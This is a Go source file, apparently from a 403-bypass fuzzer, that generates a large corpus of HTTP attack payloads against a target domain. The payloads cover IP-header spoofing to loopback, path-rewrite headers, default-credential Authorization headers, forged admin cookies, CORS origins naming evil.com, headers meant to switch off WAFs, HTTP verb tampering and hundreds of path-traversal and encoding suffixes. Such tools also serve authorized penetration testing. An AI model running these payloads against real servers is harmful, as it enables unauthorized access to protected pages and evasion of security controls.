package main

import "strings"

// Payload is a single fuzz attempt against the target.
type Payload struct {
	Type         string
	Header       map[string]string
	Method       string
	Suffix       string
	PathOverride string
	Body         string
	ContentType  string
}

// generatePayloads builds the full technique corpus. Every list mirrors a real
// bypass family: IP/header spoofing, path rewrite, protocol/port, WAF vendor,
// auth, cookie, CORS, verb tampering, path encoding, method override.
func generatePayloads(domain, path string) []Payload {
	if path == "" {
		path = "/"
	}
	var p []Payload

	// ---------- 1. IP header spoofing ----------
	ips := []string{
		"127.0.0.1", "localhost", "0.0.0.0", "0", "127.1", "127.0.1",
		"2130706433", "0x7F000001", "0177.0000.0000.0001",
		"127.0.0.1:80", "127.0.0.1:443",
		"127.0.0.1, 68.180.194.242", "127.0.0.1, 127.0.0.1",
		"8.8.8.8", "10.0.0.1", "192.168.0.1", "10.10.10.1",
		"172.16.0.1", "192.168.1.200", "10.0.0.2",
		"::1", "0:0:0:0:0:0:0:1", "[::1]",
		"127.0.0.2", "127.0.0.3", "127.0.0.4",
	}
	headerKeys := []string{
		"X-Originally-Forwarded-For", "X-Originating-IP", "X-Originating-",
		"True-Client-IP", "X-WAP-Profile",
		"X-Forwarded-For", "X-Forwarded", "Forwarded-For", "Forwarded",
		"X-Remote-IP", "X-Remote-Addr", "X-Client-IP",
		"X-Host", "X-Custom-IP-Authorization", "Client-IP", "Cluster-Client-IP",
		"X-Real-IP", "X-Originating-Host", "CF-Connecting-IP",
		"X-Forwarded-For-Original", "X-Envoy-External-Address", "X-CDN-IP",
		"X-Edge-IP", "X-Orig-IP", "Proxy-Client-IP", "WL-Proxy-Client-IP",
		"X-Forwarded-By", "X-Forwarder-For", "X-Forward-For",
		"X-Real-Ip", "Real-Ip", "X-ProxyUser-Ip", "X-Original-Remote-Addr",
	}
	for _, ip := range ips {
		for _, key := range headerKeys {
			p = append(p, Payload{Type: "IP Header Spoof", Header: map[string]string{key: ip}, Method: "GET"})
		}
	}
	// Host header swap to loopback uses the port in the original URL when present.
	hostValues := []string{"localhost", "127.0.0.1", "127.0.0.1:80", "127.0.0.1:443"}
	for _, hv := range hostValues {
		p = append(p, Payload{Type: "Host Header Swap", Header: map[string]string{"Host": hv}, Method: "GET"})
	}

	// ---------- 2. Profile / arbitrary ----------
	p = append(p, Payload{Type: "Profile Header", Header: map[string]string{"Profile": "http://" + domain}, Method: "GET"})
	p = append(p, Payload{Type: "Profile Header", Header: map[string]string{"X-Arbitrary": "http://" + domain}, Method: "GET"})
	p = append(p, Payload{Type: "Profile Header", Header: map[string]string{"Profile": "http://127.0.0.1"}, Method: "GET"})

	// ---------- 3. Path rewrite headers ----------
	for _, h := range []string{"X-Original-URL", "X-Rewrite-URL", "X-Original-URI", "X-Request-URI", "X-URI", "X-URL"} {
		p = append(p, Payload{Type: "Path Rewrite Header",
			Header: map[string]string{h: path}, PathOverride: "/", Method: "GET"})
	}
	p = append(p, Payload{Type: "Path Rewrite Header",
		Header: map[string]string{"X-HTTP-DestinationURL": "http://" + domain + path}, PathOverride: "/", Method: "GET"})
	p = append(p, Payload{Type: "Path Rewrite Header",
		Header: map[string]string{"Destination": "http://" + domain + path}, PathOverride: "/", Method: "GET"})
	p = append(p, Payload{Type: "Path Rewrite Header",
		Header: map[string]string{"X-Original-URL": path, "X-Host": domain}, PathOverride: "/", Method: "GET"})
	p = append(p, Payload{Type: "Path Rewrite Header",
		Header: map[string]string{"X-Original-URL": path, "X-Forwarded-For": "127.0.0.1"}, PathOverride: "/", Method: "GET"})

	// ---------- 4. Proxy / routing ----------
	proxyHeaders := []struct{ h, v, t string }{
		{"X-Proxy-Url", "http://127.0.0.1", "Proxy Spoof"},
		{"Proxy", "http://127.0.0.1:8080", "Proxy Spoof"},
		{"Proxy-Host", "127.0.0.1", "Proxy Spoof"},
		{"X-Original-Host", domain, "Routing Spoof"},
		{"X-Backend-Server", "localhost", "Routing Spoof"},
		{"X-Backend-Host", "127.0.0.1", "Routing Spoof"},
		{"X-Forwarded-Server", domain, "Routing Spoof"},
		{"X-Backend", "127.0.0.1", "Routing Spoof"},
		{"X-Backend-Status", "200", "Routing Spoof"},
		{"X-Forwarded-Host", domain, "Routing Spoof"},
	}
	for _, h := range proxyHeaders {
		p = append(p, Payload{Type: h.t, Header: map[string]string{h.h: h.v}, Method: "GET"})
	}

	// ---------- 5. Protocol / port ----------
	for _, proto := range []string{"http", "https", "http/1.1", "https/1.3", "http/2.0", "ftp", "ws", "wss"} {
		p = append(p, Payload{Type: "Protocol Spoof", Header: map[string]string{"X-Forwarded-Proto": proto}, Method: "GET"})
		p = append(p, Payload{Type: "Protocol Spoof", Header: map[string]string{"X-Forwarded-Scheme": proto}, Method: "GET"})
		p = append(p, Payload{Type: "Protocol Spoof", Header: map[string]string{"X-URL-Scheme": proto}, Method: "GET"})
	}
	for _, port := range []string{"80", "443", "4443", "8080", "8443"} {
		p = append(p, Payload{Type: "Port Spoof", Header: map[string]string{"X-Forwarded-Port": port}, Method: "GET"})
	}
	p = append(p, Payload{Type: "Port Spoof", Header: map[string]string{"Front-End-Https": "on"}, Method: "GET"})

	// ---------- 6. Misc / referer / origin ----------
	p = append(p, Payload{Type: "Misc", Header: map[string]string{"X-Request-ID": "127.0.0.1"}, Method: "GET"})
	p = append(p, Payload{Type: "Misc", Header: map[string]string{"X-Requested-With": "XMLHttpRequest"}, Method: "GET"})
	p = append(p, Payload{Type: "Misc", Header: map[string]string{"Via": "1.1 google"}, Method: "GET"})
	p = append(p, Payload{Type: "Misc", Header: map[string]string{"X-Correlation-ID": "127.0.0.1"}, Method: "GET"})
	p = append(p, Payload{Type: "Referer Spoof", Header: map[string]string{"Referer": "http://" + domain + path}, Method: "GET"})
	p = append(p, Payload{Type: "Referer Spoof", Header: map[string]string{"Referrer": "http://127.0.0.1"}, Method: "GET"})
	p = append(p, Payload{Type: "Origin Spoof", Header: map[string]string{"Origin": "http://" + domain}, Method: "GET"})
	p = append(p, Payload{Type: "Origin Spoof", Header: map[string]string{"Origin": "https://" + domain}, Method: "GET"})

	// ---------- 7. Content-Type / Accept ----------
	cts := []string{
		"application/json", "application/xml", "text/xml", "text/html",
		"application/x-www-form-urlencoded", "multipart/form-data; boundary=--403bypass",
		"application/xhtml+xml", "text/plain", "application/octet-stream",
		"application/x-javascript", "text/javascript", "application/graphql",
		"application/vnd.api+json", "text/csv", "application/yaml",
		"application/ld+json", "application/activity+json",
	}
	for _, ct := range cts {
		p = append(p, Payload{Type: "Content-Type Manip", Header: map[string]string{"Content-Type": ct}, Method: "GET"})
		p = append(p, Payload{Type: "Accept Manip", Header: map[string]string{"Accept": ct}, Method: "GET"})
	}

	// ---------- 8. Auth header bypass ----------
	authPayloads := []struct{ h, v, d string }{
		{"Authorization", "Basic YWRtaW46YWRtaW4=", "admin:admin"},
		{"Authorization", "Basic YWRtaW46cGFzc3dvcmQ=", "admin:password"},
		{"Authorization", "Basic Z3Vlc3Q6", "guest:blank"},
		{"Authorization", "Basic Og==", "empty:empty"},
		{"Authorization", "Bearer 1234567890abcdef", "fake bearer"},
		{"Authorization", "Bearer admin", "bearer admin"},
		{"Authorization", "Negotiate admin", "negotiate"},
		{"Authorization", "Digest admin", "digest"},
		{"X-API-Key", "admin", "x-api-key admin"},
		{"X-Auth-Token", "admin", "x-auth-token admin"},
		{"X-API-Key", "guest", "x-api-key guest"},
		{"X-Auth-Token", "guest", "x-auth-token guest"},
		{"X-Token", "admin", "x-token admin"},
		{"X-User", "admin", "x-user admin"},
		{"X-Forwarded-User", "admin", "x-forwarded-user admin"},
		{"X-UID", "0", "x-uid root"},
		{"X-User-ID", "0", "x-user-id root"},
		{"X-Api-Key", "*", "wildcard"},
	}
	for _, a := range authPayloads {
		p = append(p, Payload{Type: "Auth Bypass [" + a.d + "]", Header: map[string]string{a.h: a.v}, Method: "GET"})
	}

	// ---------- 9. Cookie bypass ----------
	for _, c := range []struct{ n, v, d string }{
		{"admin", "true", "admin=true"},
		{"admin", "1", "admin=1"},
		{"role", "admin", "role=admin"},
		{"user", "admin", "user=admin"},
		{"session", "admin", "session=admin"},
		{"auth", "true", "auth=true"},
		{"bypass", "1", "bypass=1"},
		{"is_admin", "1", "is_admin=1"},
		{"auth_level", "0", "auth_level=0"},
		{"access", "granted", "access=granted"},
		{"logged_in", "1", "logged_in=1"},
		{"admin", "*", "admin=*"},
	} {
		p = append(p, Payload{Type: "Cookie Bypass [" + c.d + "]", Header: map[string]string{"Cookie": c.n + "=" + c.v}, Method: "GET"})
	}

	// ---------- 10. CORS / origin ----------
	for _, origin := range []string{
		"null", "https://evil.com", "http://evil.com",
		"https://attacker.com", "http://attacker.com",
		"https://" + domain, "http://" + domain,
		"https://www." + domain, "http://m." + domain,
		"http://evil." + domain, "https://" + domain + ".evil.com",
	} {
		p = append(p, Payload{Type: "CORS Origin", Header: map[string]string{"Origin": origin}, Method: "GET"})
	}
	p = append(p, Payload{Type: "CORS Preflight", Method: "OPTIONS",
		Header: map[string]string{"Access-Control-Request-Method": "GET", "Origin": "https://evil.com"}})

	// ---------- 11. WAF-specific headers ----------
	wafHeaders := []struct{ h, v, d string }{
		{"X-Cloudflare-Client-IP", "127.0.0.1", "cf client IP"},
		{"CF-RAY", "1234567890abcdef", "cf ray"},
		{"CF-IPCountry", "US", "cf country"},
		{"X-Cloudflare-IP", "127.0.0.1", "cf ip"},
		{"CF-Worker", "127.0.0.1", "cf worker"},
		{"CF-Connecting-IP", "127.0.0.1", "cf connecting"},
		{"X-Amz-Cf-Id", "123", "cloudfront id"},
		{"X-Amzn-Trace-Id", "Root=1-1234567890", "x-amzn trace"},
		{"X-Amz-Website-Redirect-Location", "/", "s3 redirect"},
		{"True-Client-IP", "127.0.0.1", "akamai true client"},
		{"X-Akamai-Edge", "127.0.0.1", "akamai edge"},
		{"X-Akamai-Client-IP", "127.0.0.1", "akamai client"},
		{"X-Varnish", "123456", "varnish"},
		{"X-Cache", "HIT", "cache hit"},
		{"X-Served-By", "127.0.0.1", "served by"},
		{"X-Cache-Hits", "1", "cache hits"},
		{"X-Protection-Plan", "0", "waf off"},
		{"X-Security-Token", "bypass", "sec token"},
		{"X-Security-Protocol", "1", "sec proto"},
		{"X-Block", "false", "x-block false"},
		{"X-Cisco-Ips-Signature-Id", "0", "cisco ips off"},
		{"Cisco-Test", "bypass", "cisco test"},
		{"X-Powered-By", "PleskLin", "plesk"},
	}
	for _, w := range wafHeaders {
		p = append(p, Payload{Type: "WAF Bypass [" + w.d + "]", Header: map[string]string{w.h: w.v}, Method: "GET"})
	}

	// ---------- 12. Range / cache ----------
	p = append(p, Payload{Type: "Range", Header: map[string]string{"Range": "bytes=0-1024"}, Method: "GET"})
	p = append(p, Payload{Type: "Range", Header: map[string]string{"Range": "bytes=0-"}, Method: "GET"})
	p = append(p, Payload{Type: "Cache Bypass", Header: map[string]string{"Cache-Control": "no-cache, no-store"}, Method: "GET"})
	p = append(p, Payload{Type: "Cache Bypass", Header: map[string]string{"Pragma": "no-cache"}, Method: "GET"})

	// ---------- 13. Header name variants (case + underscores) ----------
	extraHeaderKeys := []string{
		"x-forwarded-for", "x-forwarded", "x-real-ip", "x-client-ip",
		"x-originating-ip", "client-ip", "true-client-ip",
		"X-forwarded-For", "x-Forwarded-for", "X-REAL-IP",
		"X_Forwarded_For", "X_Forwarded",
	}
	for _, ip := range []string{"127.0.0.1", "localhost", "0.0.0.0"} {
		for _, key := range extraHeaderKeys {
			p = append(p, Payload{Type: "Header Variant", Header: map[string]string{key: ip}, Method: "GET"})
		}
	}

	// ---------- 14. Connection / upgrade ----------
	p = append(p, Payload{Type: "Upgrade", Header: map[string]string{"Upgrade": "h2c", "Connection": "Upgrade"}, Method: "GET"})
	p = append(p, Payload{Type: "TE", Header: map[string]string{"TE": "trailers"}, Method: "GET"})
	p = append(p, Payload{Type: "Expect", Header: map[string]string{"Expect": "100-continue"}, Method: "GET"})
	p = append(p, Payload{Type: "Sec-Fetch", Method: "GET",
		Header: map[string]string{
			"Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate",
			"Sec-Fetch-Site": "none", "Sec-Fetch-User": "?1",
		}})

	// ---------- 15. User-Agent spoof ----------
	for _, ua := range []string{
		"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
		"Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
		"Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
		"curl/7.68.0", "python-requests/2.31.0", "Wget/1.21",
	} {
		p = append(p, Payload{Type: "User-Agent Spoof", Header: map[string]string{"User-Agent": ua}, Method: "GET"})
	}

	// ---------- 16. HTTP verbs ----------
	verbs := []string{
		"GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD",
		"TRACE", "CONNECT", "PROPFIND", "PROPPATCH", "MKCOL", "COPY",
		"MOVE", "LOCK", "UNLOCK", "PURGE", "ACL", "REPORT", "SEARCH",
		"MKACTIVITY", "CHECKOUT", "MERGE", "M-SEARCH", "NOTIFY", "SUBSCRIBE",
		"UNSUBSCRIBE", "PRI", "UPDATE", "TRACK",
	}
	for _, m := range verbs {
		p = append(p, Payload{Type: "Verb Tampering", Method: m})
	}
	for _, m := range []string{"get", "post", "put", "patch", "delete", "options", "head"} {
		p = append(p, Payload{Type: "Verb Tampering lower", Method: m})
	}

	// ---------- 17. Method override ----------
	for _, m := range []string{"POST", "GET", "PUT", "PATCH", "TRACE", "OPTIONS", "DELETE"} {
		p = append(p, Payload{Type: "Method Override",
			Header: map[string]string{"X-HTTP-Method-Override": m}, Method: "GET"})
	}
	p = append(p, Payload{Type: "Method Override",
		Header: map[string]string{"X-HTTP-Method": "POST"}, Method: "GET"})
	p = append(p, Payload{Type: "Method Override",
		Header: map[string]string{"X-Method-Override": "POST"}, Method: "GET"})

	// ---------- 18. Path suffix fuzz ----------
	// Backslash handled via constant to keep source readable.
	bs := "\\"
	suffixes := []string{
		"%2e/", "/.", "//", "./", "/./", "%20", "%09", "?", ".html", "/*", "/..;/",
		"~", ".json", ".xml", ".php", ".txt", "..%2f", "%2e%2e%2f", "%252e%252e%252f",
		"??", "&", "#", "%", "%20/", "%00", ".swp", ".bak", "~1", ".ext",
		"//%2e%2e/", "/%20%23", "/%2e%2e", "/..%3b/", "/.;/", "/;/", "/..%00/",
		"%09%3b", "%09..", "%09;", "%23%3f", "%252f%252f", "%2e%2e", "%2f",
		"%2f%20%23", "%2f%23", "%2f%2f", "%2f%3b%2f", "%2f%3b%2f%2f", "%2f%3f", "%2f%3f/",
		"%2f/", "%3b", "%3b%09", "%3b%2f%2e%2e", "%3b%2f%2e%2e%2f%2e%2e%2f%2f", "%3b%2f%2e.",
		"%3b%2f..", "%3b/%2e%2e/..%2f%2f", "%3b/%2e.", "%3b/%2f%2f../", "%3b/..", "%3b//%2f../",
		"%3f%23", "%3f%3f", "..", "..%00/;", "..%00;/", "..%09", "..%0d/;", "..%0d;/", "..%5c/",
		"..%ff/;", "..%ff;/", "..;%00/", "..;%0d/", "..;%ff/", "..;" + bs, "..;" + bs + ";", ".." + bs + ";",
		"/%20#", "/%20%23", "/%252e%252e%252f/", "/%252e%252e%253b/", "/%252e%252f/", "/%252e%253b/",
		"/%252e/", "/%252f", "/%2e%2e", "/%2e%2e%3b/", "/%2e%2e/", "/%2e%2f/", "/%2e%3b/",
		"/%2e%3b//", "/%2e/", "/%2e//", "/%2f", "/%3b/", "/..", "/..%2f", "/..%2f..%2f",
		"/..%2f..%2f..%2f", "/../", "/../../", "/../../../", "/../../..//", "/../..//",
		"/../..//../", "/../..;/", "/.././../", "/../.;/../", "/..//", "/..//../", "/..//../../",
		"/..//..;/", "/../;/", "/../;/../", "/..;%2f", "/..;%2f..;%2f", "/..;%2f..;%2f..;%2f",
		"/..;/../", "/..;/..;/", "/..;//", "/..;//../", "/..;//..;/", "/..;/;/", "/..;/;/..;/",
		"/.//", "/.;/", "/.;//", "//..", "//../../", "//..;", "//../", "//./", "//.;/", "///..",
		"///../", "///..//", "///..;", "///..;/", "///..;//", "//;/", "/;//", "/;x",
		"/;x/", "/x/../", "/x/..//", "/x/../;/", "/x/..;/", "/x/..;//", "/x/..;/;/", "/x//../",
		"/x//..;/", "/x/;/../", "/x/;/..;/", ";", ";%09", ";%09..", ";%09..;", ";%09;", ";%2F..",
		";%2f%2e%2e", ";%2f%2e%2e%2f%2e%2e%2f%2f", ";%2f%2f/../", ";%2f..", ";%2f..%2f%2e%2e%2f%2f",
		";%2f..%2f..%2f%2f", ";%2f..%2f/", ";%2f..%2f/..%2f", ";%2f..%2f/../",
	}
	for _, s := range suffixes {
		p = append(p, Payload{Type: "Path Suffix Fuzz", Method: "GET", Suffix: s})
	}

	// ---------- 19. Path prefix / case mid-path ----------
	if len(path) > 1 {
		parts := strings.Split(strings.TrimPrefix(path, "/"), "/")
		firstDir := parts[0]
		restPath := "/" + strings.Join(parts[1:], "/")
		if restPath == "/" {
			restPath = ""
		}
		prefixes := []string{
			"/%2e/", "/%ef%bc%8f/", "/./", "//", "/%20", "/%09", "/%00",
			"/..;/", "/%2e%2e%2f", "/.;/", "/;/", "/..%00/", "/..%0d/", "/..%5c/", "/..%2f/",
		}
		for _, pref := range prefixes {
			p = append(p, Payload{Type: "Path Prefix Fuzz", Method: "GET", PathOverride: pref + firstDir + restPath})
		}
		p = append(p, Payload{Type: "Path Case Fuzz", Method: "GET", PathOverride: "/" + strings.ToUpper(firstDir) + restPath})
		p = append(p, Payload{Type: "Path Case Fuzz", Method: "GET", PathOverride: "/" + firstDir + restPath + "/"})
		p = append(p, Payload{Type: "Path Prefix Double", Method: "GET", PathOverride: "/%252e/" + firstDir + restPath})
		p = append(p, Payload{Type: "Path Prefix Double", Method: "GET", PathOverride: "/%252f/" + firstDir + restPath})
	}

	return p
}
